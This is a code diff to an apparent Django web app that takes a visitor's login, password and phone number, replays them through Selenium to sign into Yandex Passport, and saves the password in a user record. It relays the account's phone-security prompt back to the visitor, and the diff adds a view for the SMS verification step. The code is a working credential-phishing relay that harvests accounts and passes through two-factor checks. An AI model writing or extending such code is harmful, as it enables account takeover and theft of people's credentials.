@@ -1,5 +1,7 @@
 import asyncio
-from django.shortcuts import render
+import logging
+
+from django.shortcuts import render, redirect
 from django.contrib import messages
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -21,6 +23,7 @@ async def index(request):
             password = request.POST.get('passwd')
             phone = request.POST.get('phone')
 
+
             if password:
                 driver = await asyncio.to_thread(sign_in, driver, login, password)
                 custom_user = CustomUser(login=login, password=password)
@@ -32,6 +35,7 @@ async def index(request):
                 phone_submit.click()
                 return await sync_to_async(render)(request, 'secure_login.html',
                                                    {'phone_number': phone_secure.text})
+
             elif login:
                 await asyncio.to_thread(open_yandex_passport, driver)
                 username_login = WebDriverWait(driver, 10).until(
@@ -87,3 +91,11 @@ async def get_driver(request, client_ip):
             driver.quit()
             selenium_drivers[client_ip] = await asyncio.to_thread(create_selenium_driver)
     return selenium_drivers[client_ip]
+
+
+async def handle_sms_verification(request):
+    client_ip = request.META.get('REMOTE_ADDR')
+    driver = await get_driver(request, client_ip)
+    if request.method == 'POST':
+        logging.warning(f'HOREEEY')
+    return await sync_to_async(render)(request, 'verification.html')
